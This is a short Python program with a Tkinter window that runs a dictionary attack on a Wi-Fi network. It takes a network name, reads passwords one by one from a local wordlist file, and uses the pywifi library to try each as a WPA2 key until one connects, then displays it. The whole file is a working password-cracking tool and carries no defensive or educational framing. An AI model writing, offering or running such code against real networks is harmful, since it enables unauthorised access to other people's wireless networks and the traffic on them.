from tkinter import *
from pywifi import const
import pywifi
from time import sleep


def wifi_connection(password, wifiname):
    wifi = pywifi.PyWiFi()  
    ifaces = wifi.interfaces()[0]  
    ifaces.disconnect()  
    sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()  
        profile.ssid = wifiname
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  
        profile.key = password  
        profile.auth = const.AUTH_ALG_OPEN
        profile.cipher = const.CIPHER_TYPE_CCMP 

        ifaces.remove_all_network_profiles()  

        temp_profile = ifaces.add_network_profile(profile)  


        ifaces.connect(temp_profile)
        sleep(3)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False


def main():
    wifiname = entry.get().strip()  

    path = r'./wifipwd.txt'
    file = open(path, 'r')
    while True:
        try:
            password = file.readline().strip()  


            connected = wifi_connection(password, wifiname)
            if connected:
                text.insert(END, 'Нашлось!')
                text.insert(END, password)
                text.see(END)
                text.update()
                file.close()
                break
            else:
                text.insert(END, f'Не подходит: {password}')
                text.see(END)
                text.update()
        except Exception:
            continue



root = Tk()
root.title('Wi-Fi ')
root.geometry('445x370')
root.configure(bg='#111')


label = Label(root, text='Названий WFi:', background="#111", foreground="#fff")
label.grid()


entry = Entry(root, font=('Microsoft Yahei', 14), background="#555", foreground="#fff")
entry.grid(row=0, column=1, pady="6")


text = Listbox(root, font=('Microsoft Yahei', 14), width=40, height=10, background="#555", foreground="#fff")
text.grid(row=1, columnspan=2, pady="6")


button = Button(root, text='Boshlash', width=20, height=2, command=main, background="#555", foreground="#fff")
button.grid(row=2, columnspan=2, pady="6")


root.mainloop()
